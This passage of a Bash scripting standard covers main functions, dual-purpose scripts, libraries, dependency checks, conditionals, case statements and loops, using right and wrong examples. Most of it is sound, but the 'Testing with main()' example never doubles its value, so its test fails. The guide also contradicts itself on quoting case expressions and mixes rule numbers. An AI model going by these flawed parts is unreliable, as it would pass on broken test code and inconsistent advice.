```

**Main function with argument parsing:**
```bash
main() {
  local -i verbose=0
  local -i dry_run=0
  local -- output_file=''
  local -a input_files=()

  while (($#)); do case $1 in
    -v|--verbose) verbose=1 ;;
    -n|--dry-run) dry_run=1 ;;
    -o|--output)
      noarg "$@"
      shift
      output_file=$1
      ;;
    -h|--help) usage; return 0 ;;
    --) shift; break ;;
    -*) die 22 "Invalid option ${1@Q}" ;;
    *) input_files+=("$1") ;;
  esac; shift; done

  input_files+=("$@")
  readonly -- verbose dry_run output_file
  readonly -a input_files

  if ((${#input_files[@]} == 0)); then
    error 'No input files specified'
    usage
    return 22
  fi

  local -- file
  for file in "${input_files[@]}"; do
    process_file "$file"
  done
  return 0
}
```

**Main function with setup/cleanup:**
```bash
cleanup() {
  local -i exit_code=${1:-$?}
  if [[ -n "${TEMP_DIR:-}" && -d "$TEMP_DIR" ]]; then
    rm -rf "$TEMP_DIR"
  fi
  return "$exit_code"
}

main() {
  trap cleanup EXIT
  TEMP_DIR=$(mktemp -d)
  readonly -- TEMP_DIR
  info "Using temp directory ${TEMP_DIR@Q}"
  # ... processing ...
  return 0
}
```

**Main function with error tracking:**
```bash
main() {
  local -i errors=0
  local -- item
  for item in "${items[@]}"; do
    if ! process_item "$item"; then
      error "Failed to process: $item"
      errors+=1
    fi
  done

  if ((errors)); then
    error "Completed with $errors errors"
    return 1
  else
    success 'All items processed successfully'
    return 0
  fi
}
```

**Main function enabling sourcing for tests:**
```bash
[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0
set -euo pipefail

main() {
  # ... script logic ...
  return 0
}

main "$@"
#fin
```

**Anti-patterns:**

```bash
# ✗ Wrong - no main function in complex script (hard to test/organize)
#!/bin/bash
set -euo pipefail
# ... 200 lines of code directly in script ...

# ✓ Correct - main function
main() { # Script logic }
main "$@"
#fin

# ✗ Wrong - main() not at end (functions defined after execution)
main() { # ... }
main "$@"
helper_function() { # ... }  # Defined after main executes!

# ✓ Correct - main() at end, called last
helper_function() { # ... }
main() { # Can call helper_function }
main "$@"
#fin

# ✗ Wrong - parsing arguments outside main
verbose=0
while (($#)); do # ... parse args ... ; done
main() { # Uses globals }
main "$@"  # Arguments already consumed!

# ✓ Correct - parsing in main
main() {
  local -i verbose=0
  while (($#)); do # ... ; done
  readonly -- verbose
}
main "$@"

# ✗ Wrong - not passing arguments
main  # Missing "$@"!

# ✓ Correct
main "$@"

# ✗ Wrong - mixing global and local logic
total=0  # Global
main() {
  local -i count=0
  ((total+=count))  # Mixes global/local
}

# ✓ Correct - all logic in main
main() {
  local -i total=0 count=0
  total+=count
}
```

**Edge cases:**

**1. Script needs global configuration:**
```bash
declare -i VERBOSE=0 DRY_RUN=0

main() {
  while (($#)); do case $1 in
    -v|--verbose) VERBOSE=1 ;;
    -n|--dry-run) DRY_RUN=1 ;;
    *) die 22 "Invalid option ${1@Q}" ;;
  esac; shift; done
  readonly -- VERBOSE DRY_RUN
}
main "$@"
```

**2. Library and executable (dual-purpose):**
```bash
utility_function() { # ... }

main() { # ... }

[[ "${BASH_SOURCE[0]}" == "${0}" ]] || return
main "$@"
#fin
```

**3. Multiple main scenarios (subcommands):**
```bash
main_install() { # Installation logic }
main_uninstall() { # Uninstallation logic }

main() {
  local -- mode="${1:-}"
  case "$mode" in
    install) shift; main_install "$@" ;;
    uninstall) shift; main_uninstall "$@" ;;
    *) die 22 "Invalid mode: $mode" ;;
  esac
}
main "$@"
```

**Testing with main():**
```bash
# Script: myapp.sh
main() {
  local -i value="$1"
  ((value * 2))
  echo "$value"
}
[[ "${BASH_SOURCE[0]}" == "${0}" ]] || return
main "$@"

# Test file: test_myapp.sh
#!/bin/bash
source ./myapp.sh  # Source without executing
result=$(main 5)
[[ "$result" == "10" ]] && echo "PASS" || echo "FAIL: Expected 10, got ${result@Q}"
```

**Key principles:**
- Use main() for scripts >200 lines
- Place main() at end, define helpers first
- Always call with `main "$@"`
- Parse arguments in main, make locals readonly after parsing
- Return 0 for success, non-zero for errors
- Use `[[ "${BASH_SOURCE[0]}" == "${0}" ]]` for testability
- main() is the orchestrator - heavy lifting in helper functions


---


**Rule: BCS0404**

## Function Export
```bash
# Export functions when needed by subshells
grep() { /usr/bin/grep "$@"; }
find() { /usr/bin/find "$@"; }
declare -fx grep find
```


---


**Rule: BCS0405**

## Production Script Optimization

Once a script is mature and ready for production:
- Remove unused utility functions (e.g., `yn()`, `decp()`, `trim()`, `s()`)
- Remove unused global variables (e.g., `SCRIPT_DIR`, `PROMPT`, `DEBUG`)
- Remove unused messaging functions not called by your script
- Keep only the functions and variables your script actually needs

**Rationale:** Reduces script size, improves clarity, eliminates maintenance burden.

**Example:** A simple script may only need `error()` and `die()`, not the full messaging suite.


---


**Rule: BCS0406**

## Dual-Purpose Scripts

**Rule: BCS0606** (Elevated from BCS010201)

Scripts that can be both executed directly and sourced as libraries.

---

#### Rationale

- Reusable functions without code duplication
- Direct execution for standalone use, library sourcing for integration
- Testing flexibility (source functions, run tests)

---

#### Basic Pattern

```bash
#!/usr/bin/env bash
# my-lib.sh - Dual-purpose library/script

# Define functions first (before any set -e)
my_function() {
  local -- arg=$1
  echo "Processing ${arg@Q}"
}
declare -fx my_function

# Check if sourced or executed
[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0

# Everything below runs only when executed directly
set -euo pipefail
shopt -s inherit_errexit shift_verbose

# Script metadata
declare -r SCRIPT_PATH=$(realpath -- "${BASH_SOURCE[0]}")
declare -r SCRIPT_NAME=${SCRIPT_PATH##*/}

main() {
  my_function "$@"
}

main "$@"
#fin
```

#### With Idempotent Initialization

```bash
#!/usr/bin/env bash
# Prevent double-initialization when sourced

[[ -v MY_LIB_VERSION ]] || {
  declare -rx MY_LIB_VERSION=1.0.0
  declare -rx MY_LIB_PATH=$(realpath -e -- "${BASH_SOURCE[0]}")
}

# Functions defined here...
my_func() { :; }
declare -fx my_func

# Source-mode exit
[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0

# Execution mode
set -euo pipefail
main() { my_func "$@"; }
main "$@"
#fin
```

#### Why set -e Comes After Check

`set -e` must come AFTER the sourced check:
- When sourced, parent script controls error handling
- `return 0` with `set -e` active could cause issues
- Library code should not impose error handling on caller

```bash
# ✗ Wrong - set -e before source check
set -euo pipefail
[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0  # Risky

# ✓ Correct - set -e after source check
[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0
set -euo pipefail
```

---

#### Usage

```bash
# As executable
./my-lib.sh arg1 arg2

# As library (source for functions)
source ./my-lib.sh
my_function "value"
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - functions not exported
my_func() { :; }
# Cannot be called from subshells after sourcing

# ✓ Correct - export functions
my_func() { :; }
declare -fx my_func
```

---

**See Also:** BCS0607 (Library Patterns), BCS0604 (Function Export)

**Full implementation:** See `examples/exemplar-code/internetip/internetip`

#fin


---


**Rule: BCS0407**

## Library Patterns

**Rule: BCS0607**

Patterns for creating reusable Bash libraries.

---

#### Rationale

- Code reuse across scripts with consistent interface
- Easier testing, maintenance, and namespace isolation

---

#### Pure Function Library

```bash
#!/usr/bin/env bash
# lib-validation.sh - Validation function library
#
# Usage: source lib-validation.sh

# Prevent execution
[[ "${BASH_SOURCE[0]}" != "$0" ]] || {
  >&2 echo 'Error: This file must be sourced, not executed'
  exit 1
}

# Library version
declare -rx LIB_VALIDATION_VERSION=1.0.0

# Validation functions
valid_ip4() {
  local -- ip=$1
  [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]] || return 1
  local -a octets
  IFS='.' read -ra octets <<< "$ip"
  for octet in "${octets[@]}"; do
    ((octet <= 255)) || return 1
  done
  return 0
}
declare -fx valid_ip4

valid_email() {
  local -- email=$1
  [[ $email =~ ^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$ ]]
}
declare -fx valid_email

#fin
```

#### Library with Configuration

```bash
#!/usr/bin/env bash
# lib-config.sh - Configuration management library

[[ "${BASH_SOURCE[0]}" != "$0" ]] || return 1

# Configurable defaults (can be overridden before sourcing)
: "${CONFIG_DIR:=/etc/myapp}"
: "${CONFIG_FILE:=$CONFIG_DIR/config}"

load_config() {
  [[ -f "$CONFIG_FILE" ]] || return 1
  source "$CONFIG_FILE"
}
declare -fx load_config

get_config() {
  local -- key=$1 default=${2:-}
  local -- value
  value=$(grep "^${key}=" "$CONFIG_FILE" 2>/dev/null | cut -d= -f2-)
  echo "${value:-$default}"
}
declare -fx get_config

#fin
```

#### Namespace Pattern

```bash
#!/usr/bin/env bash
# lib-myapp.sh - Namespaced library

[[ "${BASH_SOURCE[0]}" != "$0" ]] || exit 1

# All functions prefixed with namespace
myapp_init() { :; }
myapp_cleanup() { :; }
myapp_process() { :; }

declare -fx myapp_init myapp_cleanup myapp_process

#fin
```

#### Sourcing Libraries

```bash
# Source with path resolution
SCRIPT_DIR=${BASH_SOURCE[0]%/*}
source "$SCRIPT_DIR/lib-validation.sh"

# Source with existence check
lib_path='/usr/local/lib/myapp/lib-utils.sh'
[[ -f "$lib_path" ]] && source "$lib_path" || die 1 "Missing library ${lib_path@Q}"

# Source multiple libraries
for lib in "$LIB_DIR"/*.sh; do
  [[ -f "$lib" ]] && source "$lib"
done
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - library has side effects on source
source lib.sh  # Immediately modifies global state

# ✓ Correct - library only defines functions
source lib.sh  # Only defines functions
lib_init       # Explicit initialization call
```

---

**See Also:** BCS0606 (Dual-Purpose Scripts), BCS0608 (Dependency Management)


---


**Rule: BCS0408**

## Dependency Management

**Rule: BCS0608**

Checking and managing external dependencies in Bash scripts.

---

#### Rationale

- Clear error messages for missing tools
- Enables graceful degradation and portability checking
- Documents script requirements

---

#### Basic Dependency Check

```bash
# Single command
command -v curl >/dev/null || die 1 'curl is required but not installed'

# Multiple commands
for cmd in curl jq awk; do
  command -v "$cmd" >/dev/null || die 1 "Required ${cmd@Q}"
done
```

#### Dependency Check Function

```bash
check_dependencies() {
  local -a missing=()
  local -- cmd

  for cmd in "$@"; do
    command -v "$cmd" >/dev/null || missing+=("$cmd")
  done

  if ((${#missing[@]})); then
    error "Missing dependencies: ${missing[*]}"
    info 'Install with: sudo apt install ...'
    return 1
  fi
}

# Usage
check_dependencies curl jq sqlite3 || exit 1
```

#### Optional Dependencies

```bash
declare -i HAS_JQ=0
command -v jq >/dev/null && HAS_JQ=1 ||:

if ((HAS_JQ)); then
  result=$(echo "$json" | jq -r '.field')
else
  result=$(echo "$json" | grep -oP '"field":\s*"\K[^"]+')
fi
```

#### Version Checking

```bash
check_bash_version() {
  local -i major=${BASH_VERSINFO[0]}
  local -i minor=${BASH_VERSINFO[1]}

  if ((major < 5 || (major == 5 && minor < 2))); then
    die 1 "Requires Bash 5.2+, found $BASH_VERSION"
  fi
}

check_tool_version() {
  local -- tool=$1 min_version=$2
  local -- current_version

  current_version=$("$tool" --version 2>&1 | head -1 | grep -oE '[0-9]+\.[0-9]+')

  if [[ "$(printf '%s\n' "$min_version" "$current_version" | sort -V | head -1)" != "$min_version" ]]; then
    die 1 "$tool version $min_version+ required, found $current_version"
  fi
}
```

#### Lazy Loading

```bash
declare -- SQLITE_DB=''

get_db() {
  if [[ -z "$SQLITE_DB" ]]; then
    command -v sqlite3 >/dev/null || die 1 'sqlite3 required'
    SQLITE_DB=$(mktemp)
    sqlite3 "$SQLITE_DB" 'CREATE TABLE cache (key TEXT, value TEXT)'
  fi
  echo "$SQLITE_DB"
}
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - which is not POSIX, unreliable
which curl >/dev/null

# ✓ Correct - command -v is POSIX compliant
command -v curl >/dev/null
```

```bash
# ✗ Wrong - silent failure, cryptic error if missing
curl "$url"

# ✓ Correct - explicit check with helpful message
command -v curl >/dev/null || die 1 'curl required: apt install curl'
curl "$url"
```

---

**See Also:** BCS0607 (Library Patterns)

#fin


---


**Rule: BCS0500**

# Control Flow

This section establishes patterns for conditionals, loops, case statements, and arithmetic operations. It mandates using `[[ ]]` over `[ ]` for test expressions, `(())` for arithmetic conditionals, and covers both compact case statement formats and expanded formats for complex logic. Critical guidance includes preferring process substitution (`< <(command)`) over pipes to while loops to avoid subshell variable persistence issues, and using safe arithmetic patterns: `i+=1` or `((i+=1))` instead of `((i++))` which returns the original value and fails with `set -e` when i=0.


---


**Rule: BCS0501**

## Conditionals

**Use `[[ ]]` for string/file tests, `(())` for arithmetic:**

```bash
# String and file tests - use [[ ]]
[[ -d "$path" ]] && echo 'Directory exists' ||:
[[ -f "$file" ]] || die 1 "File not found ${file@Q}"
[[ "$status" == success ]] && continue

# Arithmetic tests - use (())
((VERBOSE==0)) || echo 'Verbose mode'
((count >= MAX_RETRIES)) && die 1 'Too many retries'

# Complex conditionals - combine both
if [[ -n "$var" ]] && ((count)); then
  process_data
fi
```

**Rationale for `[[ ]]` over `[ ]`:**
1. No word splitting or glob expansion on variables
2. Pattern matching with `==` and `=~` operators
3. Logical operators `&&` and `||` work inside (no `-a`/`-o` needed)
4. `<`, `>` for lexicographic string comparison

**Comparison `[[ ]]` vs `[ ]`:**

```bash
var='two words'

# ✗ [ ] requires quotes or fails
[ $var = 'two words' ]  # ERROR: too many arguments

# ✓ [[ ]] handles unquoted variables (but quote anyway)
[[ "$var" == 'two words' ]]  # Recommended

# Pattern matching (only in [[ ]])
[[ "$file" == *.txt ]] && echo "Text file"
[[ "$input" =~ ^[0-9]+$ ]] && echo "Number"

# Logical operators inside [[ ]]
[[ -f "$file" && -r "$file" ]] && cat "$file" ||:
```

**Arithmetic conditionals - use `(())`:**

```bash
declare -i count=0

# ✓ Correct - natural C-style syntax
if ((count)); then
  echo "Count: $count"
fi

((i >= MAX)) && die 1 'Limit exceeded'

# ✗ Wrong - using [[ ]] for arithmetic
if [[ "$count" -gt 0 ]]; then  # Unnecessary, verbose
  echo "Count: $count"
fi

# Comparison operators in (())
((a > b))   ((a >= b))  ((a < b))
((a <= b))  ((a == b))  ((a != b))
```

**Pattern matching:**

```bash
# Glob pattern matching
[[ "$filename" == *.@(jpg|png|gif) ]] && process_image "$filename"

# Regular expression matching
if [[ "$email" =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
  echo 'Valid email'
else
  die 22 "Invalid email ${email@Q}"
fi

# Case-insensitive matching
shopt -s nocasematch
[[ "$input" == yes ]] && echo "Affirmative"  # Matches YES, Yes, yes
shopt -u nocasematch
```

**Short-circuit evaluation:**

```bash
# Execute if first succeeds
[[ -f "$config" ]] && source "$config" ||:

# Execute if first fails
[[ -d "$dir" ]] || mkdir -p "$dir"
((count)) || die 1 'No items to process'
```

**Anti-patterns:**

```bash
# ✗ Wrong - old [ ] syntax
if [ -f "$file" ]; then echo 'Found'; fi

# ✗ Wrong - deprecated -a/-o in [ ]
[ -f "$file" -a -r "$file" ]  # Fragile

# ✓ Correct - use [[ ]] with &&/||
[[ -f "$file" && -r "$file" ]]

# ✗ Wrong - arithmetic with [[ ]] using -gt/-lt
[[ "$count" -gt 10 ]]  # Verbose

# ✓ Correct - use (())
((count > 10))
```

**File test operators (`[[ ]]`):**

| Operator | Meaning |
|----------|---------|
| `-e file` | File exists |
| `-f file` | Regular file |
| `-d dir` | Directory |
| `-r file` | Readable |
| `-w file` | Writable |
| `-x file` | Executable |
| `-s file` | Not empty (size > 0) |
| `-L link` | Symbolic link |
| `f1 -nt f2` | f1 newer than f2 |
| `f1 -ot f2` | f1 older than f2 |

**String test operators (`[[ ]]`):**

| Operator | Meaning |
|----------|---------|
| `-z "$str"` | Empty string |
| `-n "$str"` | Non-empty string |
| `"$a" == "$b"` | Equal |
| `"$a" != "$b"` | Not equal |
| `"$a" < "$b"` | Lexicographic less |
| `"$a" > "$b"` | Lexicographic greater |
| `"$str" =~ regex` | Regex match |
| `"$str" == pattern` | Glob match |


---


**Rule: BCS0502**

## Case Statements

**Use `case` for multi-way branching based on pattern matching. More readable and efficient than if/elif chains for single-value tests. Use compact format for single-action cases, expanded format for multi-line logic. Always align consistently and include default `*)` case.**

**Rationale:**
- Clearer than if/elif for pattern-based branching; native wildcards/alternation support
- Faster than multiple if/elif tests (single evaluation of test value)
- Easy to add/reorder cases; default `*)` ensures exhaustive handling

**When to use case vs if/elif:**

```bash
# ✓ Use case - testing single variable against multiple values
case "$action" in
  start)   start_service ;;
  stop)    stop_service ;;
  restart) restart_service ;;
  *)       die 22 "Invalid action ${action@Q}" ;;
esac

# ✓ Use case - pattern matching needed
case "$filename" in
  *.txt) process_text_file ;;
  *.pdf) process_pdf_file ;;
  *)     die 22 'Unsupported file type' ;;
esac

# ✗ Use if/elif - testing different variables or complex logic
if [[ ! -f "$file" ]]; then
  die 2 "File not found ${file@Q}"
elif [[ ! -r "$file" ]]; then
  die 1 "File not readable ${file@Q}"
fi

# ✗ Use if/elif - numeric ranges
if ((value < 0)); then error='negative'
elif ((value <= 10)); then category='small'
else category='large'
fi
```

**Case expression quoting:**

```bash
# ✓ CORRECT - no quotes needed on case expression
case ${1:-} in
  --help) usage ;;
esac

# ✗ UNNECESSARY - quotes don't add value
case "${1:-}" in
  --help) usage ;;
esac
```

Word splitting doesn't apply in case expression context; omitting quotes reduces clutter.

**Compact format** - single action per case:

```bash
# Compact case for simple argument parsing
while (($#)); do
  case $1 in
    -v|--verbose) VERBOSE=1 ;;
    -n|--dry-run) DRY_RUN=1 ;;
    -f|--force)   FORCE=1 ;;
    -h|--help)    usage; exit 0 ;;
    -o|--output)  noarg "$@"; shift; OUTPUT_FILE="$1" ;;
    --)           shift; break ;;
    -*)           die 22 "Invalid option ${1@Q}" ;;
    *)            INPUT_FILES+=("$1") ;;
  esac
  shift
done
```

**Expanded format** - multi-line actions:

```bash
while (($#)); do
  case $1 in
    -b|--builtin)     INSTALL_BUILTIN=1
                      ((VERBOSE)) && info 'Builtin installation enabled' ||:
                      ;;

    -p|--prefix)      noarg "$@"
                      shift
                      PREFIX=$1
                      BIN_DIR="$PREFIX"/bin
                      ;;

    --)               shift
                      break
                      ;;

    -*)               error "Invalid option ${1@Q}"
                      usage
                      exit 22
                      ;;
  esac
  shift
done
```

**Pattern matching syntax:**

```bash
# Literal patterns
case "$value" in
  start) echo 'Starting...' ;;
  stop) echo 'Stopping...' ;;
esac

# Wildcard patterns (globbing)
case "$filename" in
  *.txt) echo 'Text file' ;;
  *.pdf) echo 'PDF file' ;;
  *)     echo 'Unknown file type' ;;
esac

# Question mark - single character
case "$code" in
  ??)  echo 'Two-character code' ;;
  ???) echo 'Three-character code' ;;
esac

# Alternation (OR patterns)
case "$option" in
  -h|--help|help) usage; exit 0 ;;
  -v|--verbose|verbose) VERBOSE+=1 ;;
esac

# Character classes with extglob
shopt -s extglob
case "$input" in
  ?(pattern))      echo 'zero or one' ;;
  *(pattern))      echo 'zero or more' ;;
  +(pattern))      echo 'one or more' ;;
  @(start|stop))   echo 'exactly one' ;;
  !(*.tmp|*.bak))  echo 'anything except' ;;
esac

# Bracket expressions
case "$char" in
  [0-9]) echo 'Digit' ;;
  [a-z]) echo 'Lowercase' ;;
  [A-Z]) echo 'Uppercase' ;;
esac
```

**File type routing:**

```bash
process_file_by_type() {
  local -- file=$1
  local -- filename=${file##*/}

  case "$filename" in
    *.txt|*.md|*.rst)
      process_text "$file"
      ;;
    *.jpg|*.jpeg|*.png|*.gif)
      process_image "$file"
      ;;
    .*)
      warn "Skipping hidden file ${file@Q}"
      return 0
      ;;
    *.tmp|*.bak|*~)
      warn "Skipping temporary file ${file@Q}"
      return 0
      ;;
    *)
      error "Unknown file type ${file@Q}"
      return 1
      ;;
  esac
}
```

**Anti-patterns:**

```bash
# ✗ Wrong - quoting literal patterns unnecessarily
case "$value" in
  "start") echo 'Starting...' ;;
esac
# ✓ Correct
case "$value" in
  start) echo 'Starting...' ;;
esac

# ✗ Wrong - missing default case
case "$action" in
  start) start_service ;;
  stop) stop_service ;;
esac
# What if $action is 'restart'? Silent failure!
# ✓ Always include default case
case "$action" in
  start) start_service ;;
  stop) stop_service ;;
  *) die 22 "Invalid action ${action@Q}" ;;
esac

# ✗ Wrong - inconsistent format mixing
case "$opt" in
  -v) VERBOSE=1 ;;
  -o) shift
      OUTPUT=$1
      ;;
esac
# ✓ Correct - consistent compact or expanded

# ✗ Wrong - poor column alignment
case $1 in
  -v|--verbose) VERBOSE+=1 ;;
  -f|--force) FORCE=1 ;;
esac
# ✓ Correct - aligned columns
case $1 in
  -v|--verbose) VERBOSE+=1 ;;
  -f|--force)   FORCE=1 ;;
esac

# ✗ Wrong - regex patterns (not supported)
case "$input" in
  [0-9]+) echo 'Number' ;;  # Matches single digit only!
esac
# ✓ Correct - use extglob or if with regex
case "$input" in
  +([0-9])) echo 'Number' ;;  # Requires extglob
esac

# ✗ Wrong - side effects in patterns
case "$value" in
  $(complex_function)) echo 'Match' ;;  # Called for every case!
esac
# ✓ Evaluate once before case
result=$(complex_function)
case "$value" in
  "$result") echo 'Match' ;;
esac
```

**Edge cases:**

```bash
# Empty string handling
case "$value" in
  '')  echo 'Empty string' ;;
  *)   echo "Value: $value" ;;
esac

# Special characters - quote patterns
case "$filename" in
  'file (1).txt')      echo 'Match parentheses' ;;
  'file [backup].txt') echo 'Match brackets' ;;
esac

# Numeric patterns (as strings)
case "$port" in
  80|443) echo 'Standard web port' ;;
  22)     echo 'SSH port' ;;
esac
# For numeric comparison, use (()) instead

# Case in functions with return values
validate_input() {
  local -- input=$1
  case "$input" in
    [a-z]*) return 0 ;;
    [A-Z]*) return 1 ;;
    '')     return 22 ;;
    *)      return 1 ;;
  esac
}
```

**Summary:**
- **Compact format**: single-line actions, aligned `;;`
- **Expanded format**: multi-line actions, `;;` on separate line
- **Always quote test variable**: `case "$var" in`
- **Don't quote literal patterns**: `start)` not `"start")`
- **Include default case**: `*)` handles unexpected values
- **Use alternation**: `pattern1|pattern2)` for multiple matches
- **Enable extglob**: for `@()`, `!()`, `+()` patterns
- **Align consistently**: same column for actions
- **Terminate with `;;`**: every case branch needs it


---


**Rule: BCS0503**

## Loops

**Use loops to iterate over collections, process command output, or repeat operations. Prefer array iteration over string parsing, use process substitution to avoid subshell issues, and employ proper loop control with `break` and `continue`.**

**Rationale:**
- For loops efficiently iterate over arrays, globs, and ranges
- While loops process line-by-line input from commands or files
- Process substitution `< <(command)` avoids subshell variable scope issues
- Proper loop type makes intent immediately clear

**For loops - Array iteration:**

```bash
# ✓ Iterate over array elements
process_files() {
  local -a files=('document.txt' 'file with spaces.pdf' 'report (final).doc')
  local -- file
  for file in "${files[@]}"; do
    [[ -f "$file" ]] && info "Processing ${file@Q}" || warn "Not found ${file@Q}"
  done
}

# ✓ Iterate with index and value
local -a items=('alpha' 'beta' 'gamma')
local -i index; local -- item
for index in "${!items[@]}"; do
  item="${items[$index]}"
  info "Item $index: $item"
done

# ✓ Iterate over arguments
for arg in "$@"; do info "Argument: $arg"; done
```

**For loops - Glob patterns:**

```bash
# ✓ Iterate over glob matches (nullglob ensures empty loop if no matches)
for file in "$SCRIPT_DIR"/*.txt; do
  info "Processing ${file@Q}"
done

# ✓ Multiple glob patterns
for file in "$SCRIPT_DIR"/*.{txt,md,rst}; do
  [[ -f "$file" ]] && info "Processing ${file@Q}"
done

# ✓ Recursive glob (requires globstar)
shopt -s globstar
for script in "$SCRIPT_DIR"/**/*.sh; do
  [[ -f "$script" ]] && shellcheck "$script"
done

# ✓ Check if glob matched anything
local -a matches=("$SCRIPT_DIR"/*.log)
if [[ ${#matches[@]} -eq 0 ]]; then warn 'No log files found'; return 1; fi
```

**For loops - C-style:**

```bash
# ✓ C-style for loop (MUST use i+=1, never i++)
local -i i
for ((i=1; i<=10; i+=1)); do echo "Count: $i"; done

# ✓ Iterate with step
for ((i=0; i<=20; i+=2)); do echo "Even: $i"; done

# ✓ Countdown
for ((i=10; i>0; i-=1)); do echo "T-minus $i"; sleep 1; done
```

**Brace expansion:**

```bash
for i in {1..10}; do echo "$i"; done           # Range
for i in {0..100..10}; do echo "$i"; done      # Range with step
for letter in {a..z}; do echo "$letter"; done  # Character range
for env in {dev,staging,prod}; do echo "$env"; done  # Strings
for file in file{001..100}.txt; do echo "$file"; done  # Zero-padded
```

**While loops - Reading input:**

```bash
# ✓ Read file line by line
local -- line; local -i line_count=0
while IFS= read -r line; do
  line_count+=1
  echo "Line $line_count: $line"
done < "$file"

# ✓ Process command output (avoid subshell)
local -i count=0
while IFS= read -r line; do
  count+=1
done < <(find "$SCRIPT_DIR" -name '*.txt' -type f)

# ✓ Read null-delimited input
while IFS= read -r -d '' file; do
  info "Processing: $file"
done < <(find "$SCRIPT_DIR" -name '*.sh' -type f -print0)

# ✓ Read CSV with custom delimiter
while IFS=',' read -r name email age; do
  info "Name: $name, Email: $email, Age: $age"
done < "$csv_file"
```

**While loops - Argument parsing:**

```bash
main() {
  while (($#)); do
    case $1 in
      -v|--verbose) VERBOSE+=1 ;;
      -n|--dry-run) DRY_RUN=1 ;;
      -o|--output)  noarg "$@"; shift; OUTPUT_DIR=$1 ;;
      --)           shift; break ;;
      -*)           die 22 "Invalid option ${1@Q}" ;;
      *)            INPUT_FILES+=("$1") ;;
    esac
    shift
  done
  INPUT_FILES+=("$@")  # Remaining after --
}
```

**While loops - Condition-based:**

```bash
# ✓ Wait for condition
wait_for_file() {
  local -- file=$1; local -i timeout=${2:-30} elapsed=0
  while [[ ! -f "$file" ]]; do
    ((elapsed >= timeout)) && { error "Timeout"; return 1; }
    sleep 1; elapsed+=1
  done
}

# ✓ Retry with exponential backoff
retry_command() {
  local -i max=5 attempt=1 wait=1
  while ((attempt <= max)); do
    some_command && return 0
    ((attempt < max)) && { sleep "$wait"; wait=$((wait * 2)); }
    attempt+=1
  done
  return 1
}
```

**Until loops:**

```bash
# ✓ Loop UNTIL service is running
until systemctl is-active --quiet "$service"; do
  ((elapsed >= timeout)) && return 1
  sleep 1; elapsed+=1
done

# ✓ Generally prefer while (clearer)
# ✗ Confusing: until [[ ! -f "$lock_file" ]]; do sleep 1; done
# ✓ Clearer:   while [[ -f "$lock_file" ]]; do sleep 1; done
```

**Loop control - break and continue:**

```bash
# ✓ Early exit with break
for file in "${files[@]}"; do
  [[ "$file" =~ $pattern ]] && { found="$file"; break; }
done

# ✓ Skip items with continue
for file in "${files[@]}"; do
  [[ ! -f "$file" ]] && { skipped+=1; continue; }
  [[ ! -r "$file" ]] && { skipped+=1; continue; }
  processed+=1
done

# ✓ Break out of nested loops
for row in "${matrix[@]}"; do
  for col in $row; do
    [[ "$col" == 'target' ]] && break 2  # Break both loops
  done
done
```

**Infinite loops performance:**

| Construct | Performance |
|-----------|-------------|
| `while ((1))` | **Baseline (fastest)** ⚡ |
| `while :` | +9-14% slower (POSIX) |
| `while true` | +15-22% slower 🐌 |

```bash
# ✓ RECOMMENDED - fastest
while ((1)); do
  check_status
  [[ ! -f "$pid_file" ]] && break
  sleep 1
done

# ✓ ACCEPTABLE - POSIX compatibility
while :; do process_item || break; done

# ✗ AVOID - slowest
while true; do check_status; done
```

**Anti-patterns:**

```bash
# ✗ Wrong - iterating over unquoted string
for file in $files_str; do echo "$file"; done
# ✓ Correct - iterate over array
for file in "${files[@]}"; do echo "$file"; done

# ✗ Wrong - parsing ls output (NEVER!)
for file in $(ls *.txt); do process "$file"; done
# ✓ Correct - use glob directly
for file in *.txt; do process "$file"; done

# ✗ Wrong - pipe to while (subshell issue)
count=0; cat file.txt | while read -r line; do count+=1; done
echo "$count"  # Still 0!
# ✓ Correct - process substitution
while read -r line; do count+=1; done < <(cat file.txt)

# ✗ Wrong - C-style loop with ++ (fails with set -e when i=0)
for ((i=0; i<10; i++)); do echo "$i"; done
# ✓ Correct - use +=1
for ((i=0; i<10; i+=1)); do echo "$i"; done

# ✗ Wrong - redundant comparison
while (($# > 0)); do shift; done
# ✓ Correct - arithmetic truthiness
while (($#)); do shift; done

# ✗ Wrong - break without level in nested loops (ambiguous)
for i in {1..10}; do for j in {1..10}; do break; done; done
# ✓ Correct - explicit break level
for i in {1..10}; do for j in {1..10}; do break 2; done; done

# ✗ Wrong - seq for iteration (external command)
for i in $(seq 1 10); do echo "$i"; done
# ✓ Correct - brace expansion
for i in {1..10}; do echo "$i"; done

# ✗ Wrong - missing -r with read
while read line; do echo "$line"; done < file.txt
# ✓ Correct - always use -r
while IFS= read -r line; do echo "$line"; done < file.txt
```

**Edge cases:**

```bash
# Empty arrays - safe, zero iterations
empty=(); for item in "${empty[@]}"; do echo "$item"; done

# Arrays with empty elements - iterates all including empty strings
array=('' 'item2' '' 'item4')
for item in "${array[@]}"; do echo "[$item]"; done  # [],[item2],[],[item4]

# Glob with no matches (nullglob)
shopt -s nullglob
for file in /nonexistent/*.txt; do echo "$file"; done  # Never executes

# ✓ CORRECT - declare locals BEFORE loops
process_links() {
  local -- target; local -i count=0
  for link in "$BIN_DIR"/*; do target=$(readlink "$link"); done
}
# ✗ WRONG - declaring local inside loop (wasteful, misleading)
for link in "$BIN_DIR"/*; do local target; target=$(readlink "$link"); done
```

**Summary:**
- **For loops** - arrays, globs, known ranges
- **While loops** - reading input, argument parsing, condition-based iteration
- **Until loops** - rarely used; prefer while with opposite condition
- **Infinite loops** - `while ((1))` fastest; `while :` for POSIX; avoid `while true`
- **Always quote arrays** - `"${array[@]}"`
- **Use process substitution** - `< <(command)` avoids subshell
- **Never parse ls** - use glob patterns
- **Use i+=1 not i++** - ++ fails with set -e when 0
- **IFS= read -r** - always with while loops reading input
- **Specify break level** - `break 2` for nested loops


---


**Rule: BCS0504**

## Pipes to While Loops

